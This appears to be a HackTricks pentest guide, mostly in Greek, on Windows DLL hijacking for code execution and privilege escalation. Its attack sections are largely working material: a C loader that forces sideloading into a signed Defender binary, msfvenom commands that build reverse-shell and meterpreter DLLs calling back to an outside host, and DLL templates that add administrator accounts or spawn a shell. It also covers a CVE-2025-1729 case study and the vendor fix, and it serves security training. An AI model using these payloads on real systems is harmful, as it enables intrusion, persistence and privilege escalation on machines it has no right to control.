# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Βασικές Πληροφορίες

DLL Hijacking περιλαμβάνει τον χειρισμό μιας αξιόπιστης εφαρμογής ώστε να φορτώσει ένα κακόβουλο DLL. Ο όρος αυτός καλύπτει αρκετές τακτικές όπως **DLL Spoofing, Injection, and Side-Loading**. Χρησιμοποιείται κυρίως για εκτέλεση κώδικα, επίτευξη persistence και, λιγότερο συχνά, για privilege escalation. Παρά την εστίαση στην escalation εδώ, η μέθοδος hijacking παραμένει ίδια ανεξάρτητα από το σκοπό.

### Συνηθισμένες Τεχνικές

Χρησιμοποιούνται διάφορες μέθοδοι για DLL hijacking, η κάθε μία με την αποτελεσματικότητά της ανάλογα με τη στρατηγική φόρτωσης DLL της εφαρμογής:

1. **DLL Replacement**: Αντικατάσταση ενός γνήσιου DLL με ένα κακόβουλο, προαιρετικά χρησιμοποιώντας DLL Proxying για να διατηρηθεί η λειτουργικότητα του αρχικού DLL.
2. **DLL Search Order Hijacking**: Τοποθέτηση του κακόβουλου DLL σε μια διαδρομή αναζήτησης που προηγείται της νόμιμης, εκμεταλλευόμενοι το pattern αναζήτησης της εφαρμογής.
3. **Phantom DLL Hijacking**: Δημιουργία ενός κακόβουλου DLL που μια εφαρμογή θα προσπαθήσει να φορτώσει, πιστεύοντας ότι πρόκειται για ένα απαιτούμενο DLL που δεν υπάρχει.
4. **DLL Redirection**: Τροποποίηση παραμέτρων αναζήτησης όπως το %PATH% ή αρχεία .exe.manifest / .exe.local για να οδηγηθεί η εφαρμογή στο κακόβουλο DLL.
5. **WinSxS DLL Replacement**: Αντικατάσταση του νόμιμου DLL με ένα κακόβουλο αντίστοιχο στον κατάλογο WinSxS, μια μέθοδος που συχνά σχετίζεται με DLL side-loading.
6. **Relative Path DLL Hijacking**: Τοποθέτηση του κακόβουλου DLL σε έναν κατάλογο που ελέγχεται από τον χρήστη μαζί με την αντιγραμμένη εφαρμογή, μοιάζοντας με τεχνικές Binary Proxy Execution.

## Εύρεση ελλειπόντων Dlls

Ο πιο συνηθισμένος τρόπος για να βρείτε ελλείποντα Dlls μέσα σε ένα σύστημα είναι να τρέξετε [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) από τα sysinternals, **ρυθμίζοντας** τα **εξής 2 φίλτρα**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

και απλώς εμφανίστε τη **File System Activity**:

![](<../../../images/image (153).png>)

Αν ψάχνετε για **ελλείποντα dlls γενικά** αφήστε αυτό να τρέξει για μερικά **δευτερόλεπτα**.\
Αν ψάχνετε για ένα **ελλείπον dll μέσα σε ένα συγκεκριμένο εκτελέσιμο** θα πρέπει να ορίσετε **άλλο φίλτρο όπως "Process Name" "contains" "\<exec name>", να το εκτελέσετε, και να σταματήσετε την καταγραφή των γεγονότων**.

## Εκμετάλλευση ελλειπόντων Dlls

Για να αυξήσουμε προνόμια, η καλύτερη ευκαιρία είναι να μπορέσουμε να **γράψουμε ένα dll που μια διεργασία με προνόμια θα προσπαθήσει να φορτώσει** σε κάποιο από τα **σημεία όπου θα γίνει αναζήτηση**. Επομένως, θα μπορούμε να **γράψουμε** ένα dll σε έναν **φάκελο** όπου το **dll αναζητείται πριν** από τον φάκελο που βρίσκεται το **πρωτότυπο dll** (περίεργη περίπτωση), ή θα μπορέσουμε να **γράψουμε σε κάποιον φάκελο όπου θα αναζητηθεί το dll** και το πρωτότυπο **dll δεν υπάρχει** σε κανέναν φάκελο.

### Dll Search Order

**Στο** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **μπορείτε να βρείτε πώς φορτώνονται συγκεκριμένα τα Dlls.**

Οι εφαρμογές Windows αναζητούν DLLs ακολουθώντας ένα σύνολο προκαθορισμένων διαδρομών αναζήτησης, τηρώντας συγκεκριμένη σειρά. Το πρόβλημα του DLL hijacking προκύπτει όταν ένα κακόβουλο DLL τοποθετείται στρατηγικά σε έναν από αυτούς τους καταλόγους, εξασφαλίζοντας ότι θα φορτωθεί πριν από το αυθεντικό DLL. Μία λύση για να το αποτρέψετε είναι να διασφαλίσετε ότι η εφαρμογή χρησιμοποιεί απόλυτες διαδρομές όταν αναφέρεται στα DLL που χρειάζεται.

Μπορείτε να δείτε την **σειρά αναζήτησης DLL σε 32-bit** συστήματα παρακάτω:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Αυτή είναι η **προεπιλεγμένη** σειρά αναζήτησης με ενεργοποιημένο το **SafeDllSearchMode**. Όταν είναι απενεργοποιημένο, ο τρέχων κατάλογος ανεβαίνει στη δεύτερη θέση. Για να απενεργοποιήσετε αυτή τη λειτουργία, δημιουργήστε την τιμή μητρώου **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** και ορίστε την σε 0 (η προεπιλογή είναι enabled).

Εάν η συνάρτηση [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) καλείται με **LOAD_WITH_ALTERED_SEARCH_PATH**, η αναζήτηση ξεκινά από τον κατάλογο του εκτελέσιμου module που φορτώνει η **LoadLibraryEx**.

Τέλος, σημειώστε ότι **ένα dll μπορεί να φορτωθεί αφού δηλωθεί η απόλυτη διαδρομή αντί απλώς το όνομα**. Σε αυτή την περίπτωση το dll **θα αναζητηθεί μόνο σε αυτή τη διαδρομή** (εάν το dll έχει εξαρτήσεις, αυτές θα αναζητηθούν όπως συμβαίνει με τα φορτωμένα κατά όνομα).

Υπάρχουν και άλλοι τρόποι για να αλλάξετε τη σειρά αναζήτησης αλλά δεν θα τους εξηγήσω εδώ.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Ένας προηγμένος τρόπος για να επηρεάσετε με ντετερμινιστικό τρόπο τη διαδρομή αναζήτησης DLL μιας νεοδημιουργημένης διεργασίας είναι να ορίσετε το πεδίο DllPath στο RTL_USER_PROCESS_PARAMETERS κατά τη δημιουργία της διεργασίας με τις native APIs του ntdll. Παρέχοντας εδώ έναν κατάλογο που ελέγχεται από τον attacker, μια διεργασία-στόχος που επιλύει ένα imported DLL κατά όνομα (χωρίς απόλυτη διαδρομή και χωρίς να χρησιμοποιεί τα safe loading flags) μπορεί να αναγκαστεί να φορτώσει ένα κακόβουλο DLL από αυτόν τον κατάλογο.

Βασική ιδέα
- Δημιουργήστε τις παραμέτρους της διεργασίας με RtlCreateProcessParametersEx και δώστε ένα προσαρμοσμένο DllPath που δείχνει στον φάκελο που ελέγχετε (π.χ. τον κατάλογο όπου βρίσκεται ο dropper/unpacker σας).
- Δημιουργήστε τη διεργασία με RtlCreateUserProcess. Όταν το binary-στόχος επιλύσει ένα DLL κατά όνομα, ο loader θα συμβουλευτεί το παρεχόμενο DllPath κατά την επίλυση, επιτρέποντας αξιόπιστο sideloading ακόμη και όταν το κακόβουλο DLL δεν είναι colocated με το target EXE.

Σημειώσεις/περιορισμοί
- Αυτό επηρεάζει τη διεργασία-παιδί που δημιουργείται· διαφέρει από το SetDllDirectory, το οποίο επηρεάζει μόνο την τρέχουσα διεργασία.
- Ο στόχος πρέπει να import-άρει ή να κάνει LoadLibrary ένα DLL κατά όνομα (χωρίς απόλυτη διαδρομή και χωρίς να χρησιμοποιεί LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- Τα KnownDLLs και οι σκληροκωδικοποιημένες απόλυτες διαδρομές δεν μπορούν να hijackαριστούν. Τα forwarded exports και το SxS μπορεί να αλλάξουν την προτεραιότητα.

Minimal C example (ntdll, wide strings, simplified error handling):
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
Operational usage example
- Τοποθετήστε ένα κακόβουλο xmllite.dll (εξάγοντας τις απαιτούμενες συναρτήσεις ή proxying στο πραγματικό) στον φάκελο DllPath σας.
- Εκκινήστε ένα signed binary που είναι γνωστό ότι αναζητά xmllite.dll με το παραπάνω τρόπο. Ο loader επιλύει την import μέσω του παρεχόμενου DllPath και sideloads το DLL σας.

Αυτή η τεχνική έχει παρατηρηθεί in-the-wild να οδηγεί multi-stage sideloading chains: ένας αρχικός launcher αποθέτει ένα helper DLL, το οποίο στη συνέχεια δημιουργεί ένα Microsoft-signed, hijackable binary με custom DllPath για να αναγκάσει το φόρτωμα του attacker’s DLL από έναν staging directory.


#### Exceptions on dll search order from Windows docs

Ορισμένες εξαιρέσεις στην τυπική σειρά αναζήτησης DLL αναφέρονται στην τεκμηρίωση των Windows:

- Όταν συναντιέται ένα **DLL που μοιράζεται το όνομά του με ένα που είναι ήδη φορτωμένο στη μνήμη**, το σύστημα παρακάμπτει την συνήθη αναζήτηση. Αντ’ αυτού, πραγματοποιεί έναν έλεγχο για redirection και manifest πριν προχωρήσει στο DLL που είναι ήδη στη μνήμη. **Σε αυτό το σενάριο, το σύστημα δεν πραγματοποιεί αναζήτηση για το DLL**.
- Σε περιπτώσεις όπου το DLL αναγνωρίζεται ως **known DLL** για την τρέχουσα έκδοση των Windows, το σύστημα θα χρησιμοποιήσει την έκδοσή του αυτού του known DLL, μαζί με οποιαδήποτε από τα dependent DLLs του, **παρακάμπτοντας τη διαδικασία αναζήτησης**. Το registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** περιέχει μια λίστα αυτών των known DLLs.
- Εάν ένα **DLL έχει dependencies**, η αναζήτηση για αυτά τα dependent DLLs εκτελείται σαν να είχαν δηλωθεί μόνο με τα **module names**, ανεξάρτητα από το αν το αρχικό DLL είχε προσδιοριστεί μέσω πλήρους διαδρομής.

### Escalating Privileges

**Απαιτήσεις**:

- Εντοπίστε μια διεργασία που λειτουργεί ή θα λειτουργήσει υπό **διαφορετικά προνόμια** (horizontal ή lateral movement), η οποία **δεν διαθέτει ένα DLL**.
- Διασφαλίστε ότι υπάρχει **write access** σε οποιονδήποτε **directory** όπου θα **αναζητηθεί** το **DLL**. Αυτή η τοποθεσία μπορεί να είναι ο φάκελος του εκτελέσιμου ή ένας φάκελος μέσα στο system path.

Ναι, τα προαπαιτούμενα είναι δύσκολο να βρεθούν καθώς **κατά προεπιλογή είναι κάπως περίεργο να βρεις ένα privileged executable που του λείπει ένα dll** και είναι ακόμη **πιο περίεργο να έχεις write permissions σε φάκελο του system path** (κατά προεπιλογή δεν μπορείτε). Αλλά, σε misconfigured περιβάλλοντα αυτό είναι δυνατό.\
Σε περίπτωση που είστε τυχεροί και πληροίτε τις απαιτήσεις, μπορείτε να δείτε το έργο [UACME](https://github.com/hfiref0x/UACME). Ακόμα κι αν ο **κύριος στόχος του project είναι να bypass UAC**, μπορεί να βρείτε εκεί ένα **PoC** ενός Dll hijaking για την έκδοση των Windows που σας ενδιαφέρει (πιθανώς απλά αλλάζοντας το path του φακέλου όπου έχετε write permissions).

Σημειώστε ότι μπορείτε να **ελέγξετε τα δικαιώματά σας σε έναν φάκελο** κάνοντας:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Και **έλεγξε τα δικαιώματα όλων των φακέλων μέσα στο PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Μπορείτε επίσης να ελέγξετε τα imports ενός executable και τα exports ενός dll με:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Για έναν πλήρη οδηγό για το πώς να **εκμεταλλευτείτε Dll Hijacking για να ανεβάσετε προνόμια** με δικαιώματα εγγραφής σε έναν **System Path folder** ελέγξτε:


{{#ref}}
writable-sys-path-+dll-hijacking-privesc.md
{{#endref}}

### Αυτοματοποιημένα εργαλεία

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) θα ελέγξει αν έχετε δικαιώματα εγγραφής σε οποιονδήποτε φάκελο μέσα στο system PATH.\
Άλλα ενδιαφέροντα αυτοματοποιημένα εργαλεία για την ανακάλυψη αυτής της ευπάθειας είναι οι **συναρτήσεις PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ and _Write-HijackDll._

### Παράδειγμα

Σε περίπτωση που βρείτε ένα εκμεταλλεύσιμο σενάριο, ένα από τα πιο σημαντικά στοιχεία για να το εκμεταλλευτείτε επιτυχώς είναι να **δημιουργήσετε ένα dll που εξάγει τουλάχιστον όλες τις συναρτήσεις που θα εισάγει το εκτελέσιμο από αυτό**. Σημειώστε ότι το Dll Hijacking είναι χρήσιμο προκειμένου να [escalate from Medium Integrity level to High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) ή από[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Μπορείτε να βρείτε ένα παράδειγμα **πώς να δημιουργήσετε ένα έγκυρο dll** μέσα σε αυτή τη μελέτη για dll hijacking με σκοπό την εκτέλεση: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Επιπλέον, στην **επόμενη ενότητα** μπορείτε να βρείτε μερικούς **βασικούς κώδικες dll** που μπορεί να είναι χρήσιμοι ως **πρότυπα** ή για να δημιουργήσετε ένα **dll με εξαγόμενες μη απαραίτητες συναρτήσεις**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Βασικά, ένα **Dll proxy** είναι ένα Dll ικανό να **εκτελέσει τον κακόβουλο κώδικά σας όταν φορτωθεί**, αλλά και να **εκθέσει** και να **λειτουργήσει** όπως **αναμένεται** προωθώντας όλες τις κλήσεις στη πραγματική βιβλιοθήκη.

Με το εργαλείο [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ή [**Spartacus**](https://github.com/Accenture/Spartacus) μπορείτε ουσιαστικά να **υποδείξετε ένα εκτελέσιμο και να επιλέξετε τη βιβλιοθήκη** που θέλετε να proxify και να **παράγετε ένα proxified dll** ή να **υποδείξετε το Dll** και να **παράγετε ένα proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Λήψη meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Δημιουργήστε έναν χρήστη (x86 — δεν είδα έκδοση x64):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Δικό σας

Σημειώστε ότι σε αρκετές περιπτώσεις η Dll που compile κάνετε πρέπει να **export several functions** οι οποίες πρόκειται να φορτωθούν από τη victim process. Εάν αυτές οι functions δεν υπάρχουν, το **binary won't be able to load** αυτές και το **exploit will fail**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## Case Study: CVE-2025-1729 - Αναβάθμιση δικαιωμάτων με χρήση TPQMAssistant.exe

This case demonstrates **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracked as **CVE-2025-1729**.

### Λεπτομέρειες ευπάθειας

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Υλοποίηση Exploit

Ένας επιτιθέμενος μπορεί να τοποθετήσει ένα κακόβουλο stub `hostfxr.dll` στον ίδιο κατάλογο, εκμεταλλευόμενος το ελλείπον DLL για να επιτύχει code execution στο πλαίσιο του χρήστη:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Ροή επίθεσης

1. Ως τυπικός χρήστης, τοποθετήστε το `hostfxr.dll` στο `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Περιμένετε να εκτελεστεί η προγραμματισμένη εργασία στις 9:30 π.μ. στο πλαίσιο του τρέχοντος χρήστη.
3. Εάν ένας διαχειριστής είναι συνδεδεμένος όταν εκτελεστεί η εργασία, το κακόβουλο DLL τρέχει στη συνεδρία του διαχειριστή σε medium integrity.
4. Συνδυάστε τυπικές τεχνικές παράκαμψης του UAC για να ανυψώσετε τα προνόμια από medium integrity σε SYSTEM.

### Αντιμετώπιση

Η Lenovo κυκλοφόρησε την έκδοση UWP **1.12.54.0** μέσω του Microsoft Store, η οποία εγκαθιστά το TPQMAssistant στο `C:\Program Files (x86)\Lenovo\TPQM\TPQMAssistant\`, αφαιρεί την ευάλωτη προγραμματισμένη εργασία και απεγκαθιστά τα legacy Win32 components.

## References

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)


- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)


- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)


{{#include ../../../banners/hacktricks-training.md}}
